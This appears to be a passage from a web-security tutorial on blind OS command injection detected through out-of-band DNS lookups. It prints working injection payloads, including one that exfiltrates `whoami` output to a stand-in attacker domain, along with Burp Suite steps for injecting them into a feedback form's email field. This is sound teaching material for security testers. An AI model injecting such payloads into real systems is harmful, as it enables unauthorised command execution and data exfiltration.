An attacker can use an injected command that will trigger an [out-of-band (OAST)](https://portswigger.net/burp/application-security-testing/oast) network interaction with a system that they control, using OAST techniques. For example:
```txt
& nslookup oast.web-attacker.com &
```
This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor their system to see if the lookup happens, confirming a command injection vulnerability.

To do this via Burp Suite Professional, follow these steps:
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:
`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
3. Right-click and select **Insert Collaborator payload** to insert a Burp Collaborator subdomain where indicated in the modified `email` parameter.
> Note: If Burp Collaborator is not available, we can use [CanaryTokens](https://canarytokens.org/generate#) and [interactsh](https://github.com/projectdiscovery/interactsh) as alternatives.


Another technique is using out-of-band channel to easily exfiltrate output from injected commands:
```txt
& nslookup `whoami`.oast.web-attacker.com &
```
This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:
```txt
wwwuser.kgji2ohoyw.web-attacker.com
```
